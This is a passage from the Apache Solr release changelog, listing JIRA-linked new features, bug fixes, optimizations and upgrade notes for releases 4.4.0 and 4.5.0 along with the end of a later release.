  6. [SOLR-5301](http://issues.apache.org/jira/browse/SOLR-5301): DELETEALIAS command prints CREATEALIAS in logs

     (janhoy)
  7. [SOLR-5255](http://issues.apache.org/jira/browse/SOLR-5255): Remove unnecessary call to fetch and watch live nodes in ZkStateReader
     cluster watcher.

     (Jessica Cheng via shalin)
  8. [SOLR-5305](http://issues.apache.org/jira/browse/SOLR-5305): Admin UI - Reloading System-Information on Dashboard does not work
     anymore

     (steffkes)
  9. [SOLR-5314](http://issues.apache.org/jira/browse/SOLR-5314): Shard split action should use soft commits instead of hard commits
     to make sub shard data visible.

     (Kalle Aaltonen, shalin)
  10. [SOLR-5327](http://issues.apache.org/jira/browse/SOLR-5327): [SOLR-4915](http://issues.apache.org/jira/browse/SOLR-4915), "The root cause should be returned to the user when a SolrCore create
      call fails", was reverted.

      (Mark Miller)
  11. [SOLR-5317](http://issues.apache.org/jira/browse/SOLR-5317): SolrCore persistence bugs if defining SolrCores in solr.xml.

      (Mark Miller, Yago Riveiro)
  12. [SOLR-5306](http://issues.apache.org/jira/browse/SOLR-5306): Extra collection creation parameters like collection.configName are
      not being respected.

      (Mark Miller, Liang Tianyu, Nathan Neulinger)
  13. [SOLR-5325](http://issues.apache.org/jira/browse/SOLR-5325): ZooKeeper connection loss can cause the Overseer to stop processing
      commands.

      (Christine Poerschke, Mark Miller, Jessica Cheng)
  14. [SOLR-4327](http://issues.apache.org/jira/browse/SOLR-4327): HttpSolrServer can leak connections on errors.

      (Karl Wright, Mark Miller)
  15. [SOLR-5349](http://issues.apache.org/jira/browse/SOLR-5349): CloudSolrServer - ZK timeout arguments passed to ZkStateReader are flipped.

      (Ricardo Merizalde via shalin)
  16. [SOLR-5330](http://issues.apache.org/jira/browse/SOLR-5330): facet.method=fcs on single values fields could sometimes result
      in incorrect facet labels.

      (Michael Froh, yonik)
* Other Changes   (1)
  1. [SOLR-5323](http://issues.apache.org/jira/browse/SOLR-5323): Disable ClusteringComponent by default in collection1 example.
     The solr.clustering.enabled system property needs to be set to 'true'
     to enable the clustering contrib (reverts [SOLR-4708](http://issues.apache.org/jira/browse/SOLR-4708)).

     (Dawid Weiss)

## Older Releases

### Release 4.5.0 [2013-10-05]

+ Versions of Major Components   (5)
  1. Apache Tika 1.4
  2. Carrot2 3.8.0
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
+ Upgrading from Solr 4.4.0   (5)
  1. XML configuration parsing is now more strict about situations where a single
     setting is allowed but multiple values are found. In the past, one value
     would be chosen arbitrarily and silently. Starting with 4.5, configuration
     parsing will fail with an error in situations like this. If you see error
     messages such as "solrconfig.xml contains more than one value for config path:
     XXXXX" or "Found Z configuration sections when at most 1 is allowed matching
     expression: XXXXX" check your solrconfig.xml file for multiple occurrences of
     XXXXX and delete the ones that you do not wish to use. See [SOLR-4953](http://issues.apache.org/jira/browse/SOLR-4953) &
     [SOLR-5108](http://issues.apache.org/jira/browse/SOLR-5108) for more details.
  2. In the past, schema.xml parsing would silently ignore "default" or "required"
     options specified on <dynamicField/> declarations. Begining with 4.5, attempting
     to do configured these on a dynamic field will cause an init error. If you
     encounter one of these errors when upgrading an existing schema.xml, you can
     safely remove these attributes, regardless of their value, from your config and
     Solr will continue to bahave exactly as it did in previous versions. See
     [SOLR-5227](http://issues.apache.org/jira/browse/SOLR-5227) for more details.
  3. The UniqFieldsUpdateProcessorFactory has been improved to support all of the
     FieldMutatingUpdateProcessorFactory selector options. The <lst named="fields">
     init param option is now deprecated and should be replaced with the more standard
     <arr name="fieldName">. See [SOLR-4249](http://issues.apache.org/jira/browse/SOLR-4249) for more details.
  4. UpdateRequestExt has been removed as part of [SOLR-4816](http://issues.apache.org/jira/browse/SOLR-4816). You should use UpdateRequest
     instead.
  5. CloudSolrServer can now use multiple threads to add documents by default. This is a
     small change in runtime semantics when using the bulk add method - you will still
     end up with the same exception on a failure, but some documents beyond the one that
     failed may have made it in. To get the old, single threaded behavior, set parallel updates
     to false on the CloudSolrServer instance.
#### Detailed Change List

+ New Features   (18)
  1. [SOLR-5219](http://issues.apache.org/jira/browse/SOLR-5219): Rewritten selection of the default search and document clustering
     algorithms.

     (Dawid Weiss)
  2. [SOLR-5202](http://issues.apache.org/jira/browse/SOLR-5202): Support easier overrides of Carrot2 clustering attributes via
     XML data sets exported from the Workbench.

     (Dawid Weiss)
  3. [SOLR-5126](http://issues.apache.org/jira/browse/SOLR-5126): Update Carrot2 clustering to version 3.8.0, update Morfologik
     to version 1.7.1

     (Dawid Weiss)
  4. [SOLR-2345](http://issues.apache.org/jira/browse/SOLR-2345): Enhanced geodist() to work with an RPT field, provided that the
     field is referenced via 'sfield' and the query point is constant.

     (David Smiley)
  5. [SOLR-5082](http://issues.apache.org/jira/browse/SOLR-5082): The encoding of URL-encoded query parameters can be changed with
     the "ie" (input encoding) parameter, e.g. "select?q=m%FCller&ie=ISO-8859-1".
     The default is UTF-8. To change the encoding of POSTed content, use the
     "Content-Type" HTTP header.

     (Uwe Schindler, Shawn Heisey)
  6. [SOLR-4221](http://issues.apache.org/jira/browse/SOLR-4221): Custom sharding

     (Noble Paul)
  7. [SOLR-4808](http://issues.apache.org/jira/browse/SOLR-4808): Persist and use router,replicationFactor and maxShardsPerNode at Collection
     and Shard level

     (Noble Paul, Shalin Mangar)
  8. [SOLR-5006](http://issues.apache.org/jira/browse/SOLR-5006): CREATESHARD command for 'implicit' shards

     (Noble Paul)
  9. [SOLR-5017](http://issues.apache.org/jira/browse/SOLR-5017): Allow sharding based on the value of a field

     (Noble Paul)
  10. [SOLR-4222](http://issues.apache.org/jira/browse/SOLR-4222): create custom sharded collection via collections API

      (Noble Paul)
  11. [SOLR-4718](http://issues.apache.org/jira/browse/SOLR-4718): Allow solr.xml to be stored in ZooKeeper.

      (Mark Miller, Erick Erickson)
  12. [SOLR-5156](http://issues.apache.org/jira/browse/SOLR-5156): Enhance ZkCLI to allow uploading of arbitrary files to ZK.

      (Erick Erickson)
  13. [SOLR-5165](http://issues.apache.org/jira/browse/SOLR-5165): Single-valued docValues fields no longer require a default value.
      Additionally they work with sortMissingFirst, sortMissingLast, facet.missing,
      exists() in function queries, etc.

      (Robert Muir)
  14. [SOLR-5182](http://issues.apache.org/jira/browse/SOLR-5182): Add NoOpRegenerator, a regenerator for custom per-segment caches
      where items are preserved across commits.

      (Robert Muir)
  15. [SOLR-4249](http://issues.apache.org/jira/browse/SOLR-4249): UniqFieldsUpdateProcessorFactory now extends
      FieldMutatingUpdateProcessorFactory and supports all of it's selector options. Use
      of the "fields" init param is now deprecated in favor of "fieldName"

      (hossman)
  16. [SOLR-2548](http://issues.apache.org/jira/browse/SOLR-2548): Allow multiple threads to be specified for faceting. When threading, one
      can specify facet.threads to parallelize loading the uninverted fields. In at least
      one extreme case this reduced warmup time from 20 seconds to 3 seconds.

      (Janne Majaranta,
      Gun Akkor via Erick Erickson, David Smiley)
  17. [SOLR-4816](http://issues.apache.org/jira/browse/SOLR-4816): CloudSolrServer can now route updates locally and no longer relies on inter-node
      update forwarding.

      (Joel Bernstein, Shikhar Bhushan, Stephen Riesenberg, Mark Miller)
  18. [SOLR-3249](http://issues.apache.org/jira/browse/SOLR-3249): Allow CloudSolrServer and SolrCmdDistributor to use JavaBin.

      (Mark Miller)
+ Bug Fixes   (30)
  1. [SOLR-3633](http://issues.apache.org/jira/browse/SOLR-3633): web UI reports an error if CoreAdminHandler says there are no
     SolrCores

     (steffkes)
  2. [SOLR-4489](http://issues.apache.org/jira/browse/SOLR-4489): SpellCheckComponent can throw StringIndexOutOfBoundsException
     when generating collations involving multiple word-break corrections.

     (James Dyer)
  3. [SOLR-5087](http://issues.apache.org/jira/browse/SOLR-5087) - CoreAdminHandler.handleMergeAction generating NullPointerException

     (Patrick Hunt via Erick Erickson)
  4. [SOLR-5107](http://issues.apache.org/jira/browse/SOLR-5107): Fixed NPE when using numTerms=0 in LukeRequestHandler

     (Ahmet Arslan, hossman)
  5. [SOLR-4679](http://issues.apache.org/jira/browse/SOLR-4679), [SOLR-4908](http://issues.apache.org/jira/browse/SOLR-4908), [SOLR-5124](http://issues.apache.org/jira/browse/SOLR-5124): Text extracted from HTML or PDF files
     using Solr Cell was missing ignorable whitespace, which is inserted by
     TIKA for convenience to support plain text extraction without using the
     HTML elements. This bug resulted in glued words.

     (hossman, Uwe Schindler)
  6. [SOLR-5121](http://issues.apache.org/jira/browse/SOLR-5121): zkcli usage help for makepath doesn't match actual command.

     (Daniel Collins via Mark Miller)
  7. [SOLR-5119](http://issues.apache.org/jira/browse/SOLR-5119): Managed schema problems after adding fields via Schema Rest API.

     (Nils KÃ¼bler, Steve Rowe)
  8. [SOLR-5133](http://issues.apache.org/jira/browse/SOLR-5133): HdfsUpdateLog can fail to close a FileSystem instance if init
     is called more than once.

     (Mark Miller)
  9. [SOLR-5135](http://issues.apache.org/jira/browse/SOLR-5135): Harden Collection API deletion of /collections/$collection
     ZooKeeper node.

     (Mark Miller)
  10. [SOLR-4764](http://issues.apache.org/jira/browse/SOLR-4764): When using NRT, just init the first reader from IndexWriter.

      (Robert Muir, Mark Miller)
  11. [SOLR-5122](http://issues.apache.org/jira/browse/SOLR-5122): Fixed bug in spellcheck.collateMaxCollectDocs. Eliminates risk
      of divide by zero, and makes estimated hit counts meaningful in non-optimized
      indexes.

      (hossman)
  12. [SOLR-3936](http://issues.apache.org/jira/browse/SOLR-3936): Fixed QueryElevationComponent sorting when used with Grouping

      (Michael Garski via hossman)
  13. [SOLR-5171](http://issues.apache.org/jira/browse/SOLR-5171): SOLR Admin gui works in IE9, breaks in IE10.

      (Joseph L Howard via
      steffkes)
  14. [SOLR-5174](http://issues.apache.org/jira/browse/SOLR-5174): Admin UI - Query View doesn't highlight (json) Result if it
      contains HTML Tags

      (steffkes)
  15. [SOLR-4817](http://issues.apache.org/jira/browse/SOLR-4817) Solr should not fall back to the back compat built in solr.xml in SolrCloud
      mode

      (Erick Erickson)
  16. [SOLR-5112](http://issues.apache.org/jira/browse/SOLR-5112): Show full message in Admin UI Logging View

      (Matthew Keeney via
      steffkes)
  17. [SOLR-5190](http://issues.apache.org/jira/browse/SOLR-5190): SolrEntityProcessor substitutes variables only once in child entities

      (Harsh Chawla, shalin)
  18. [SOLR-3852](http://issues.apache.org/jira/browse/SOLR-3852): Fixed ZookeeperInfoServlet so that the SolrCloud Admin UI pages will
      work even if ZK contains nodes with data which are not utf8 text.

      (hossman)
  19. [SOLR-5206](http://issues.apache.org/jira/browse/SOLR-5206): Fixed OpenExchangeRatesOrgProvider to use refreshInterval correctly

      (Catalin, hossman)
  20. [SOLR-5215](http://issues.apache.org/jira/browse/SOLR-5215): Fix possibility of deadlock in ZooKeeper ConnectionManager.

      (Mark Miller, Ricardo Merizalde)
  21. [SOLR-4909](http://issues.apache.org/jira/browse/SOLR-4909): Use DirectoryReader.openIfChanged in non-NRT mode.

      (Michael Garski via Robert Muir)
  22. [SOLR-5227](http://issues.apache.org/jira/browse/SOLR-5227): Correctly fail schema initalization if a dynamicField is configured to
      be required, or have a default value.

      (hossman)
  23. [SOLR-5231](http://issues.apache.org/jira/browse/SOLR-5231): Fixed a bug with the behavior of BoolField that caused documents w/o
      a value for the field to act as if the value were true in functions if no other
      documents in the same index segment had a value of true.

      (Robert Muir, hossman, yonik)
  24. [SOLR-5233](http://issues.apache.org/jira/browse/SOLR-5233): The "deleteshard" collections API doesn't wait for cluster state to update,
      can fail if some nodes of the deleted shard were down and had incorrect logging.

      (Christine Poerschke, shalin)
  25. [SOLR-5150](http://issues.apache.org/jira/browse/SOLR-5150): HdfsIndexInput may not fully read requested bytes.

      (Mark Miller, Patrick Hunt)
  26. [SOLR-5240](http://issues.apache.org/jira/browse/SOLR-5240): All solr cores will now be loaded in parallel (as opposed to a fixed number)
      in zookeeper mode to avoid deadlocks due to replicas waiting for other replicas
      to come up.

      (yonik)
  27. [SOLR-5243](http://issues.apache.org/jira/browse/SOLR-5243): Killing a shard in one collection can result in leader election in a different
      collection if they share the same coreNodeName.

      (yonik, Mark Miller)
  28. [SOLR-5281](http://issues.apache.org/jira/browse/SOLR-5281): IndexSchema log message was printing '[null]' instead of
      '[<core name>]'

      (Jun Ohtani via Steve Rowe)
  29. [SOLR-5279](http://issues.apache.org/jira/browse/SOLR-5279): Implicit properties don't seem to exist on core RELOAD

      (elyograg, hossman, Steve Rowe)
  30. [SOLR-5291](http://issues.apache.org/jira/browse/SOLR-5291): Solrj does not propagate the root cause to the user for many errors.

      (Mark Miller)
+ Optimizations   (5)
  1. [SOLR-5044](http://issues.apache.org/jira/browse/SOLR-5044): Admin UI - Note on Core-Admin about directories while creating
     core

     (steffkes)
  2. [SOLR-5134](http://issues.apache.org/jira/browse/SOLR-5134): Have HdfsIndexOutput extend BufferedIndexOutput.

     (Mark Miller, Uwe Schindler)
  3. [SOLR-5057](http://issues.apache.org/jira/browse/SOLR-5057): QueryResultCache should not related with the order of fq's list

     (Feihong Huang via Erick Erickson)
  4. [SOLR-4816](http://issues.apache.org/jira/browse/SOLR-4816): CloudSolrServer now uses multiple threads to send updates by default.

     (Joel Bernstein via Mark Miller)
  5. [SOLR-3530](http://issues.apache.org/jira/browse/SOLR-3530): Better error messages / Content-Type validation in SolrJ.

     (Mark Miller, hossman)
+ Other Changes   (7)
  1. [SOLR-4708](http://issues.apache.org/jira/browse/SOLR-4708): Enable ClusteringComponent by default in collection1 example.
     The solr.clustering.enabled system property is set to 'true' by default.

     (ehatcher, Dawid Weiss)
  2. [SOLR-4914](http://issues.apache.org/jira/browse/SOLR-4914), [SOLR-5162](http://issues.apache.org/jira/browse/SOLR-5162): Factor out core list persistence and discovery into a
     new CoresLocator interface.

     (Alan Woodward, Shawn Heisey)
  3. [SOLR-5056](http://issues.apache.org/jira/browse/SOLR-5056): Improve type safety of ConfigSolr class.

     (Alan Woodward)
  4. [SOLR-4951](http://issues.apache.org/jira/browse/SOLR-4951): Better randomization of MergePolicy in Solr tests

     (hossman)
  5. [SOLR-4953](http://issues.apache.org/jira/browse/SOLR-4953), [SOLR-5108](http://issues.apache.org/jira/browse/SOLR-5108): Make XML Configuration parsing fail if an xpath matches
     multiple nodes when only a single value or plugin instance is expected.

     (hossman)
  6. The routing parameter "shard.keys" is deprecated as part of [SOLR-5017](http://issues.apache.org/jira/browse/SOLR-5017) .The new parameter name is '\_route\_' .
     The old parameter should continue to work for another release

     (Noble Paul)
  7. [SOLR-5173](http://issues.apache.org/jira/browse/SOLR-5173): Solr-core's Maven configuration includes test-only Hadoop
     dependencies as indirect compile-time dependencies.

     (Chris Collins, Steve Rowe)

### Release 4.4.0 [2013-07-23]

+ Versions of Major Components   (5)
  1. Apache Tika 1.4
  2. Carrot2 3.6.2
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
+ Upgrading from Solr 4.3.0   (3)
  1. TieredMergePolicy and the various subtypes of LogMergePolicy no longer have
     an explicit "setUseCompoundFile" method. Instead the behavior of new
     segments is determined by the IndexWriter configuration, and the MergePolicy
     is only consulted to determine if merge segements should use the compound
     file format (based on the value of "setNoCFSRatio"). If you have explicitly
     configured one of these classes using <mergePolicy> and include an init arg
     like this...
     <bool name="useCompoundFile">true</bool>
     ...this will now be treated as if you specified...
     <useCompoundFile>true</useCompoundFile>
     ...directly on the <indexConfig> (overriding any value already set using that
     syntax) and a warning will be logged to updated your configuration. Users
     with an explicitly declared <mergePolicy> are encouraged to review the
     current javadocs for their MergePolicy subclass and review their configured
     options carefully. See [SOLR-4941](http://issues.apache.org/jira/browse/SOLR-4941), [SOLR-4934](http://issues.apache.org/jira/browse/SOLR-4934) and [LUCENE-5038](http://issues.apache.org/jira/browse/LUCENE-5038) for more
     information.
  2. [SOLR-4778](http://issues.apache.org/jira/browse/SOLR-4778): The signature of LogWatcher.registerListener has changed, from
     (ListenerConfig, CoreContainer) to (ListenerConfig). Users implementing their
     own LogWatcher classes will need to change their code accordingly.
  3. [LUCENE-5063](http://issues.apache.org/jira/browse/LUCENE-5063): ByteField and ShortField have been deprecated and will be removed
     in 5.0. If you are still using these field types, you should migrate your
     fields to TrieIntField.
#### Detailed Change List

+ New Features   (22)
  1. [SOLR-3251](http://issues.apache.org/jira/browse/SOLR-3251): Dynamically add fields to schema.

     (Steve Rowe, Robert Muir, yonik)
  2. [SOLR-4761](http://issues.apache.org/jira/browse/SOLR-4761), [SOLR-4976](http://issues.apache.org/jira/browse/SOLR-4976): Add option to plugin a merged segment warmer into solrconfig.xml.
     Info about segments warmed in the background is available via infostream.

     (Mark Miller, Ryan Ernst, Mike McCandless, Robert Muir)
  3. [SOLR-3240](http://issues.apache.org/jira/browse/SOLR-3240): Add "spellcheck.collateMaxCollectDocs" option so that when testing
     potential Collations against the index, SpellCheckComponent will only collect
     n documents, thereby estimating the hit-count. This is a performance optimization
     in cases where exact hit-counts are unnecessary. Also, when "collateExtendedResults"
     is false, this optimization is always made

     (James Dyer).
  4. [SOLR-4785](http://issues.apache.org/jira/browse/SOLR-4785): New MaxScoreQParserPlugin returning max() instead of sum() of terms

     (janhoy)
  5. [SOLR-4234](http://issues.apache.org/jira/browse/SOLR-4234): Add support for binary files in ZooKeeper.

     (Eric Pugh via Mark Miller)
  6. [SOLR-4048](http://issues.apache.org/jira/browse/SOLR-4048): Add findRecursive method to NamedList.

     (Shawn Heisey)
  7. [SOLR-4228](http://issues.apache.org/jira/browse/SOLR-4228): SolrJ's SolrPing object has new methods for ping, enable, and
     disable.

     (Shawn Heisey, hossman, Steve Rowe)
  8. [SOLR-4893](http://issues.apache.org/jira/browse/SOLR-4893): Extend FieldMutatingUpdateProcessor.ConfigurableFieldNameSelector
     to enable checking whether a field matches any schema field. To select field
     names that don't match any fields or dynamic fields in the schema, add
     <bool name="fieldNameMatchesSchemaField">false</bool> to an update
     processor's configuration in solrconfig.xml.

     (Steve Rowe, hossman)
  9. [SOLR-4921](http://issues.apache.org/jira/browse/SOLR-4921): Admin UI now supports adding documents to Solr

     (gsingers, steffkes)
  10. [SOLR-4916](http://issues.apache.org/jira/browse/SOLR-4916): Add support to write and read Solr index files and transaction log
      files to and from HDFS.

      (phunt, Mark Miller, Greg Chanan)
  11. [SOLR-4892](http://issues.apache.org/jira/browse/SOLR-4892): Add FieldMutatingUpdateProcessorFactory subclasses
      Parse{Date,Integer,Long,Float,Double,Boolean}UpdateProcessorFactory. These
      factories have a default selector that matches all fields that either donât
      match any schema field, or are in the schema with the corresponding
      typeClass. If they see a value that is not a CharSequence, or can't parse
      the value, they leave it as is. For multi-valued fields, these processors
      will not convert any values unless all are first successfully parsed, or
      already are instances of the target class. Ordering the processors, e.g.
      [Boolean, Long, Double, Date] will allow e.g. values ["2", "5", "8.6"] to
      be left alone by the Boolean and Long processors, but then converted by the
      Double processor.

      (Steve Rowe, hossman)
  12. [SOLR-4972](http://issues.apache.org/jira/browse/SOLR-4972): Add PUT command to ZkCli tool.

      (Roman Shaposhnik via Mark Miller)
  13. [SOLR-4973](http://issues.apache.org/jira/browse/SOLR-4973): Adding getter method for defaultCollection on CloudSolrServer.

      (Furkan KAMACI via Mark Miller)
  14. [SOLR-4897](http://issues.apache.org/jira/browse/SOLR-4897): Add solr/example/example-schemaless/, an example config set
      for schemaless mode.

      (Steve Rowe)
  15. [SOLR-4655](http://issues.apache.org/jira/browse/SOLR-4655): Add option to have Overseer assign generic node names so that
      new addresses can host shards without naming confusion.

      (Mark Miller, Anshum Gupta)
  16. [SOLR-4977](http://issues.apache.org/jira/browse/SOLR-4977): Add option to send IndexWriter's infostream to the logging system.

      (Ryan Ernst via Robert Muir)
  17. [SOLR-4693](http://issues.apache.org/jira/browse/SOLR-4693): A "deleteshard" collections API that unloads all replicas of a given
      shard and then removes it from the cluster state. It will remove only those shards
      which are INACTIVE or have no range (created for custom sharding).

      (Anshum Gupta, shalin)
  18. [SOLR-5003](http://issues.apache.org/jira/browse/SOLR-5003): CSV Update Handler supports optionally adding the line number/row id to
      a document

      (gsingers)
  19. [SOLR-5010](http://issues.apache.org/jira/browse/SOLR-5010): Add support for creating copy fields to the Schema REST API

      (gsingers)
  20. [SOLR-4991](http://issues.apache.org/jira/browse/SOLR-4991): Register QParserPlugins as SolrInfoMBeans

      (ehatcher)
  21. [SOLR-4943](http://issues.apache.org/jira/browse/SOLR-4943): Add a new system wide info admin handler that exposes the system info
      that could previously only be retrieved using a SolrCore.

      (Mark Miller)
  22. [SOLR-3076](http://issues.apache.org/jira/browse/SOLR-3076): Block joins. Documents and their sub-documents must be indexed
      as a block.
      {!parent which=<allParents>}<someChildren> takes in a query that matches child
      documents and results in matches on their parents.
      {!child of=<allParents>}<someParents> takes in a query that matches some parent
      documents and results in matches on their children.

      (Mikhail Khludnev, Vadim Kirilchuk, Alan Woodward, Tom Burton-West, Mike McCandless,
      hossman, yonik)
+ Bug Fixes   (36)
  1. [SOLR-4333](http://issues.apache.org/jira/browse/SOLR-4333): edismax parser to not double-escape colons if already escaped by
     the client application

     (James Dyer, Robert J. van der Boon)
  2. [SOLR-4776](http://issues.apache.org/jira/browse/SOLR-4776): Solrj doesn't return "between" count in range facets

     (Philip K. Warren via shalin)
  3. [SOLR-4616](http://issues.apache.org/jira/browse/SOLR-4616): HitRatio on caches is now exposed over JMX MBeans as a float.

     (Greg Bowyer)
  4. [SOLR-4803](http://issues.apache.org/jira/browse/SOLR-4803): Fixed core discovery mode (ie: new style solr.xml) to treat
     'collection1' as the default core name.

     (hossman)
  5. [SOLR-4790](http://issues.apache.org/jira/browse/SOLR-4790): Throw an error if a core has the same name as another core, both old and
     new style solr.xml
  6. [SOLR-4842](http://issues.apache.org/jira/browse/SOLR-4842): Fix facet.field local params from affecting other facet.field's.

     (ehatcher, hossman)
  7. [SOLR-4814](http://issues.apache.org/jira/browse/SOLR-4814): If a SolrCore cannot be created it should remove any information it
     published about itself from ZooKeeper.

     (Mark Miller)
  8. [SOLR-4863](http://issues.apache.org/jira/browse/SOLR-4863): Removed non-existent attribute sourceId from dynamic JMX stats
     to fix AttributeNotFoundException

     (suganuma, hossman via shalin)
  9. [SOLR-4891](http://issues.apache.org/jira/browse/SOLR-4891): JsonLoader should preserve field value types from the JSON content stream.

     (Steve Rowe)
  10. [SOLR-4805](http://issues.apache.org/jira/browse/SOLR-4805): SolreCore#reload should not call preRegister and publish a DOWN state to
      ZooKeeper.

      (Mark Miller, Jared Rodriguez)
  11. [SOLR-4899](http://issues.apache.org/jira/browse/SOLR-4899): When reconnecting after ZooKeeper expiration, we need to be willing to wait
      forever, not just for 30 seconds.

      (Mark Miller)
  12. [SOLR-4920](http://issues.apache.org/jira/browse/SOLR-4920): JdbcDataSource incorrectly suppresses exceptions when retrieving a connection from
      a JNDI context and falls back to trying to use DriverManager to obtain a connection. Additionally,
      if a SQLException is thrown while initializing a connection, such as in setAutoCommit(), the
      connection will not be closed.

      (Chris Eldredge via shalin)
  13. [SOLR-4915](http://issues.apache.org/jira/browse/SOLR-4915): The root cause should be returned to the user when a SolrCore create call fails.

      (Mark Miller)
  14. [SOLR-4925](http://issues.apache.org/jira/browse/SOLR-4925) : Collection create throws NPE when 'numShards' param is missing

      (Noble Paul)
  15. [SOLR-4910](http://issues.apache.org/jira/browse/SOLR-4910): persisting solr.xml is broken. More stringent testing of persistence fixed
      up a number of issues and several bugs with persistence. Among them are
      > don't persisting implicit properties
      > should persist zkHost in the <solr> tag (user's list)
      > reloading a core that has transient="true" returned an error. reload should load
      a transient core if it's not yet loaded.
      > No longer persisting loadOnStartup or transient core properties if they were not
      specified in the original solr.xml
      > Testing flushed out the fact that you couldn't swap a core marked transient=true
      loadOnStartup=false because it hadn't been loaded yet.
      > [SOLR-4862](http://issues.apache.org/jira/browse/SOLR-4862), CREATE fails to persist schema, config, and dataDir
      > [SOLR-4363](http://issues.apache.org/jira/browse/SOLR-4363), not persisting coreLoadThreads in <solr> tag
      > [SOLR-3900](http://issues.apache.org/jira/browse/SOLR-3900), logWatcher properties not persisted
      > [SOLR-4850](http://issues.apache.org/jira/browse/SOLR-4850), cores defined as loadOnStartup=true, transient=false can't be searched

      (Erick Erickson)
  16. [SOLR-4923](http://issues.apache.org/jira/browse/SOLR-4923): Commits to non leaders as part of a request that also contain updates
      can execute out of order.

      (hossman, Ricardo Merizalde, Mark Miller)
  17. [SOLR-4932](http://issues.apache.org/jira/browse/SOLR-4932): persisting solr.xml saves some parameters it shouldn't when they weren't
      defined in the original. Benign since the default values are saved, but still incorrect.

      (Erick Erickson, thanks Shawn Heisey for helping test!)
  18. [SOLR-4934](http://issues.apache.org/jira/browse/SOLR-4934), [SOLR-4941](http://issues.apache.org/jira/browse/SOLR-4941): Fix handling of <mergePolicy> init arg
      "useCompoundFile" needed after changes in [LUCENE-5038](http://issues.apache.org/jira/browse/LUCENE-5038)

      (hossman)
  19. [SOLR-4456](http://issues.apache.org/jira/browse/SOLR-4456): Admin UI: Displays dashboard even if Solr is down

      (steffkes)
  20. [SOLR-4949](http://issues.apache.org/jira/browse/SOLR-4949): UI Analysis page dropping characters from input box

      (steffkes)
  21. [SOLR-4960](http://issues.apache.org/jira/browse/SOLR-4960): Fix race conditions in shutdown of CoreContainer
      and getCore that could cause a request to attempt to use a core that
      has shut down.

      (yonik)
  22. [SOLR-4926](http://issues.apache.org/jira/browse/SOLR-4926): Fixed rare replication bug that normally only manifested when
      using compound file format.

      (yonik, Mark Miller)
  23. [SOLR-4974](http://issues.apache.org/jira/browse/SOLR-4974): Outgrowth of [SOLR-4960](http://issues.apache.org/jira/browse/SOLR-4960) that includes transient cores and pending cores

      (Erick Erickson)
  24. [SOLR-3369](http://issues.apache.org/jira/browse/SOLR-3369): shards.tolerant=true is broken for group queries

      (Russell Black, Martijn van Groningen, Jabouille jean Charles, Ryan McKinley via shalin)
  25. [SOLR-4452](http://issues.apache.org/jira/browse/SOLR-4452): Hunspell stemmer should not merge duplicate dictionary entries

      (janhoy)
  26. [SOLR-5000](http://issues.apache.org/jira/browse/SOLR-5000): ManagedIndexSchema doesn't persist uniqueKey tag after calling addFields
      method.

      (Jun Ohtani, Steve Rowe)
  27. [SOLR-4982](http://issues.apache.org/jira/browse/SOLR-4982): Creating a core while referencing system properties looks like it loses files
      Actually, instanceDir, config, dataDir and schema are not dereferenced properly
      when creating cores that reference sys vars (e.g. &dataDir=${dir}). In the dataDir
      case in particular this leads to the index being put in a directory literally named
      ${dir} but on restart the sysvar will be properly dereferenced.
  28. [SOLR-4788](http://issues.apache.org/jira/browse/SOLR-4788): Multiple Entities DIH delta import: dataimporter.[entityName].last\_index\_time
      is empty.

      (chakming wong, James Dyer via shalin)
  29. [SOLR-4978](http://issues.apache.org/jira/browse/SOLR-4978): Time is stripped from datetime column when imported into Solr date field
      if convertType=true.

      (Bill Au, shalin)
  30. [SOLR-5019](http://issues.apache.org/jira/browse/SOLR-5019): spurious ConcurrentModificationException when spell check component
      was in use with filters.

      (yonik)
  31. [SOLR-5018](http://issues.apache.org/jira/browse/SOLR-5018): The Overseer should avoid publishing the state for collections that do not
      exist under the /collections zk node.

      (Mark Miller)
  32. [SOLR-5028](http://issues.apache.org/jira/browse/SOLR-5028),[SOLR-5029](http://issues.apache.org/jira/browse/SOLR-5029): ShardHandlerFactory was not being created properly when
      using new-style solr.xml, and was not being persisted properly when using
      old-style.

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe, Ryan Ernst, Alan Woodward)
  33. [SOLR-4997](http://issues.apache.org/jira/browse/SOLR-4997): The splitshard api doesn't call commit on new sub shards before
      switching shard states. Multiple bugs related to sub shard recovery and
      replication are also fixed.

      (shalin)
  34. [SOLR-5034](http://issues.apache.org/jira/browse/SOLR-5034): A facet.query that parses or analyzes down to a null Query would
      throw a NPE. Fixed.

      (David Smiley)
  35. [SOLR-5039](http://issues.apache.org/jira/browse/SOLR-5039): Admin/Schema Browser displays -1 for term counts for multiValued fields.
  36. [SOLR-5037](http://issues.apache.org/jira/browse/SOLR-5037): The CSV loader now accepts field names that are not in the schema.

      (gsingers, ehatcher, Steve Rowe)
+ Optimizations   (9)
  1. [SOLR-4923](http://issues.apache.org/jira/browse/SOLR-4923): Commit to all nodes in a collection in parallel rather than locally and
     then to all other nodes.

     (hossman, Ricardo Merizalde, Mark Miller)
  2. [SOLR-3838](http://issues.apache.org/jira/browse/SOLR-3838): Admin UI - Multiple filter queries are not supported in Query UI

     (steffkes)
  3. [SOLR-4719](http://issues.apache.org/jira/browse/SOLR-4719) : Admin UI - Default to wt=json on Query-Screen

     (steffkes)
  4. [SOLR-4611](http://issues.apache.org/jira/browse/SOLR-4611): Admin UI - Analysis-Urls with empty parameters create empty result table

     (steffkes)
  5. [SOLR-4955](http://issues.apache.org/jira/browse/SOLR-4955): Admin UI - Show address bar on top for Schema + Config

     (steffkes)
  6. [SOLR-4412](http://issues.apache.org/jira/browse/SOLR-4412): New parameter langid.lcmap to map detected language code to be placed
     in "language" field

     (janhoy)
  7. [SOLR-4815](http://issues.apache.org/jira/browse/SOLR-4815): Admin-UI - DIH: Let "commit" be checked by default

     (steffkes)
  8. [SOLR-5002](http://issues.apache.org/jira/browse/SOLR-5002): optimize numDocs(Query,DocSet) when filterCache is null

     (Robert Muir)
  9. [SOLR-5012](http://issues.apache.org/jira/browse/SOLR-5012): optimize search with filter when filterCache is null

     (Robert Muir)
+ Other Changes   (17)
  1. [SOLR-4737](http://issues.apache.org/jira/browse/SOLR-4737): Update Guava to 14.0.1

     (Mark Miller)
  2. [SOLR-2079](http://issues.apache.org/jira/browse/SOLR-2079): Add option to pass HttpServletRequest in the SolrQueryRequest context map.

